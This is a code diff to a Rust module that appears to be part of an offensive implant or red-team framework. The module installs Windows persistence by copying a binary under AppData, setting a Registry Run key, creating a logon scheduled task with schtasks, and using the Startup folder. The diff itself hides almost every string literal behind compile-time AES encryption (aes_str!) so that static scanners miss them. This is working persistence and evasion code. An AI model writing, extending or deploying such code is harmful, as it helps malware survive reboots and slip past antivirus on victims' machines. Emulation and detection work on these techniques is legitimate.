@@ -11,12 +11,17 @@
 
 #![cfg(target_os = "windows")]
 
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use std::ffi::OsStr;
 use std::iter::once;
+use std::sync::OnceLock;
 use std::os::windows::ffi::OsStrExt;
 use std::path::PathBuf;
 
 // ── Win32 registry FFI ─────────────────────────────────────────────────
+// Registry hive/access/error constants are OS-fixed (winreg.h) and not
+// mirrored by the typed FFI config, so they stay const.
 
 const HKCU: isize = -2147483647i32 as isize; // 0x80000001
 const HKLM: isize = -2147483646i32 as isize; // 0x80000002
@@ -100,13 +105,13 @@ fn from_wide_nul(buf: &[u16]) -> String {
 // Returns the destination path. No-ops if source is already there.
 
 fn stable_drop(source: &str, name: &str) -> Result<String, String> {
-    let appdata = std::env::var("APPDATA")
-        .map_err(|_| "APPDATA environment variable not set".to_string())?;
+    let appdata = std::env::var(aes_str!("APPDATA"))
+        .map_err(|_| aes_str!("APPDATA environment variable not set"))?;
 
     let ext = std::path::Path::new(source)
         .extension()
         .map(|e| format!(".{}", e.to_string_lossy()))
-        .unwrap_or_else(|| ".exe".to_string());
+        .unwrap_or_else(|| aes_str!(".exe"));
 
     let dst = format!("{}\\Microsoft\\{}{}", appdata, name, ext);
 
@@ -125,7 +130,12 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
     Ok(dst)
 }
 
-const RUN_SUBKEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
+static RUN_SUBKEY: OnceLock<String> = OnceLock::new();
+
+// Registry Run subkey, decrypted once and cached (was a plain const).
+fn run_subkey() -> &'static str {
+    RUN_SUBKEY.get_or_init(|| aes_str!(r"Software\Microsoft\Windows\CurrentVersion\Run"))
+}
 
 // ── T1547.001 - Registry Run Key ──────────────────────────────────────
 
@@ -133,7 +143,7 @@ pub fn install_run(value_name: &str, binary_path: &str, use_hklm: bool) -> Resul
     let stable = stable_drop(binary_path, value_name)?;
 
     let root = if use_hklm { HKLM } else { HKCU };
-    let subkey_w = to_wide(RUN_SUBKEY);
+    let subkey_w = to_wide(run_subkey());
     let name_w   = to_wide(value_name);
     let data_w   = to_wide(&stable);
     // REG_SZ data includes the null terminator; len() is in u16 units
@@ -177,17 +187,17 @@ pub fn install_run(value_name: &str, binary_path: &str, use_hklm: bool) -> Resul
         return Err(format!("RegSetValueExW failed ({})", rc2));
     }
 
-    let hive = if use_hklm { "HKLM" } else { "HKCU" };
+    let hive = if use_hklm { aes_str!("HKLM") } else { aes_str!("HKCU") };
     Ok(format!(
-        "[+] Run key installed\n    Copied: {} → {stable}\n    Hive:  {hive}\n    Key:   {RUN_SUBKEY}\n    Value: {value_name}\n    Data:  {stable}\n    \
+        "[+] Run key installed\n    Copied: {} → {stable}\n    Hive:  {hive}\n    Key:   {}\n    Value: {value_name}\n    Data:  {stable}\n    \
          Detection: Sysmon 12/13 (registry), ETW Kernel-Registry",
-        binary_path
+        binary_path, run_subkey()
     ))
 }
 
 pub fn remove_run(value_name: &str, use_hklm: bool) -> Result<String, String> {
     let root = if use_hklm { HKLM } else { HKCU };
-    let subkey_w = to_wide(RUN_SUBKEY);
+    let subkey_w = to_wide(run_subkey());
     let name_w   = to_wide(value_name);
 
     let mut hkey: isize = 0;
@@ -326,13 +336,13 @@ unsafe fn install_task_com(task_name: &str, binary_path: &str) -> Result<String,
 fn install_task_schtasks(task_name: &str, stable_path: &str, original_path: &str) -> Result<String, String> {
     use std::process::Command;
 
-    let rc = Command::new("schtasks")
+    let rc = Command::new(aes_str!("schtasks"))
         .args([
-            "/create", "/f",
-            "/sc",  "onlogon",
-            "/rl",  "limited",
-            "/tn",  task_name,
-            "/tr",  stable_path,
+            aes_str!("/create"), aes_str!("/f"),
+            aes_str!("/sc"),  aes_str!("onlogon"),
+            aes_str!("/rl"),  aes_str!("limited"),
+            aes_str!("/tn"),  task_name.to_string(),
+            aes_str!("/tr"),  stable_path.to_string(),
         ])
         .status()
         .map_err(|e| format!("schtasks.exe: {e}"))?;
@@ -383,8 +393,8 @@ unsafe fn remove_task_com(task_name: &str) -> Result<String, String> {
 #[cfg(not(target_env = "msvc"))]
 fn remove_task_schtasks(task_name: &str) -> Result<String, String> {
     use std::process::Command;
-    let rc = Command::new("schtasks")
-        .args(["/delete", "/f", "/tn", task_name])
+    let rc = Command::new(aes_str!("schtasks"))
+        .args([aes_str!("/delete"), aes_str!("/f"), aes_str!("/tn"), task_name.to_string()])
         .status()
         .map_err(|e| format!("schtasks.exe: {e}"))?;
     if rc.success() {
@@ -402,8 +412,8 @@ fn remove_task_schtasks(task_name: &str) -> Result<String, String> {
 // Explorer at logon - no shortcut (.lnk) needed for PE targets.
 
 fn startup_folder() -> Result<PathBuf, String> {
-    let appdata = std::env::var("APPDATA")
-        .map_err(|_| "APPDATA environment variable not set".to_string())?;
+    let appdata = std::env::var(aes_str!("APPDATA"))
+        .map_err(|_| aes_str!("APPDATA environment variable not set"))?;
     Ok(PathBuf::from(appdata)
         .join("Microsoft")
         .join("Windows")
@@ -473,7 +483,7 @@ pub fn list() -> String {
 
 fn list_run_keys(use_hklm: bool) -> Vec<String> {
     let root = if use_hklm { HKLM } else { HKCU };
-    let subkey_w = to_wide(RUN_SUBKEY);
+    let subkey_w = to_wide(run_subkey());
     let mut hkey: isize = 0;
 
     let rc = unsafe { RegOpenKeyExW(root, subkey_w.as_ptr(), 0, KEY_READ, &mut hkey) };
